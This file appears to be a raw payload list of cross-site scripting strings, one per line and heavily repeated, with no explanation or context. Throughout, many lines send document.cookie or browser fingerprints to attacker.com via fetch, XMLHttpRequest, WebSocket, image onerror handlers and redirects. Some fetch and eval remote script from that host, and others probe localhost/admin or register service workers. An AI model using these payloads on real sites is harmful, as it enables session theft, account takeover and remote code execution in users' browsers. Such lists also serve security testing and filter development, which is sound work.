<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<svg onload="alert(1)"></svg>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<svg onload="alert(1)"></svg>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<svg onload="alert(1)"></svg>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<svg onload="alert(1)"></svg>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<svg onload="alert(1)"></svg>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<svg onload="alert(1)"></svg>
<div style="background-image: url('javascript:alert(1)')"></div>
<svg onload="alert(1)"></svg>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<svg onload="alert(1)"></svg>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<svg onload="alert(1)"></svg>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<svg onload="alert(1)"></svg>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<svg onload="alert(1)"></svg>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<svg onload="alert(1)"></svg>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
